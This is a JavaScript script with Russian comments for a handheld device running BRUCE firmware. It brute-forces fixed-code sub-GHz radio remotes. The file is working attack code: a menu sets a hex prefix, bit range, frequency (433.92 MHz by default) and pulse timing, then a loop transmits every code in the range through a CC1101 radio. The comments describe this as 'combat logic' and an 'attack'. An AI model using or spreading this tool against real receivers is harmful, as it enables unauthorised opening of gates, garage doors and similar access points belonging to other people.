// radio-rf-brute.js (ZetaOS Tactical Module 1/5)
// Запускается с SD-карты на прошивке BRUCE/BRUTUS

// --- БАЗОВЫЕ УТИЛИТЫ (core-utils.js встроены) ---
var LINE_HEIGHT = 16;
var ZetaUI = {
    log_to_display: function(message, line, color) {
        if (line === 0) fillScreen(0);
        var displayColor = color || 0xFFFF; // White
        drawString(message, 3, line * LINE_HEIGHT, displayColor);
    },
    dialog_choice: function(options) { return dialogChoice(options); },
    show_error: function(message) { dialogError(message); fillScreen(0); ZetaUI.log_to_display("--- ERROR ---", 0, 0xF800); delay(2000); fillScreen(0); }
};
var ZetaConvert = {
    hex_to_int: function(hexString) { return parseInt(hexString, 16); },
    int_to_hex: function(intValue) { return intValue.toString(16).toUpperCase(); }
};
// ----------------------------------------------------


// --- БОЕВАЯ ЛОГИКА: RF BRUTE-FORCE ---

// Переменные атаки (Значения по умолчанию)
var value_prefix = 0x445700; 
var no_bits = 8;  // 1-byte range (256 tries)
var delay_ms = 200; 
var freq = 433920000; 
var te_val = 174; // Длительность импульса
var count_val = 10; // Повторения

function run_brute_force() {
    var max_val = value_prefix + (1 << no_bits);
    
    ZetaUI.log_to_display("STARTING RF BRUTE", 0, 0x07E0); // Green color
    ZetaUI.log_to_display("Freq: " + freq / 1000000 + " MHz", 1);
    
    for (var brute_val = value_prefix; brute_val < max_val; brute_val++) {
        var curr_val_hex = ZetaConvert.int_to_hex(brute_val);

        ZetaUI.log_to_display("Attempt: " + curr_val_hex, 2);
        ZetaUI.log_to_display("Range: " + (brute_val - value_prefix + 1) + "/" + (1 << no_bits), 3);
        
        if (getAnyPress()) {
            ZetaUI.log_to_display("ATTACK STOPPED!", 5, 0xF800); // Red color
            break;
        }

        // КРИТИЧЕСКАЯ КОМАНДА: Вызов функции ядра BRUCE
        var r = subghzTransmit(curr_val_hex, freq, te_val, count_val); 

        if (!r) {
            ZetaUI.show_error("TX Error: Check CC1101 connection!");
            break;
        }
        
        delay(delay_ms);
    }
    delay(2000);
}


// --- ГЛАВНОЕ МЕНЮ (Запускается при выборе скрипта) ---
while (true) {
    fillScreen(0);
    var choice = ZetaUI.dialog_choice({
        ["1. Prefix: " + ZetaConvert.int_to_hex(value_prefix)]: "prefix",
        ["2. Bits: " + no_bits + " (" + (1 << no_bits) + " tries)"]: "no_bits",
        ["3. Delay: " + delay_ms + " ms"]: "delay_ms",
        ["4. Freq: " + freq / 1000000 + " MHz"]: "freq",
        ["5. TX Pulse: " + te_val + " / " + count_val]: "config_tx",
        ["---> START BRUTE-FORCE <---"]: "attack"
    });

    if (choice === "") break;  // Quit
    else if (choice === "prefix") value_prefix = ZetaConvert.hex_to_int(keyboard(ZetaConvert.int_to_hex(value_prefix), 32, "Start HEX value"));
    else if (choice === "no_bits") no_bits = parseInt(keyboard(String(no_bits), 32, "Bits to iterate (1-16)"));
    else if (choice === "delay_ms") delay_ms = parseInt(keyboard(String(delay_ms), 32, "Delay (ms)"));
    else if (choice === "freq") freq = parseInt(keyboard(String(freq), 32, "Frequency (Hz)"));
    else if (choice === "config_tx") {
        te_val = parseInt(keyboard(String(te_val), 32, "Pulse width (TE value)"));
        count_val = parseInt(keyboard(String(count_val), 32, "Repeat count"));
    }
    else if (choice === "attack") {
        if (!value_prefix || !no_bits || !delay_ms || !freq) {
            ZetaUI.show_error("Invalid parameters set.");
            continue;
        }
        run_brute_force();
    }
    fillScreen(0);
}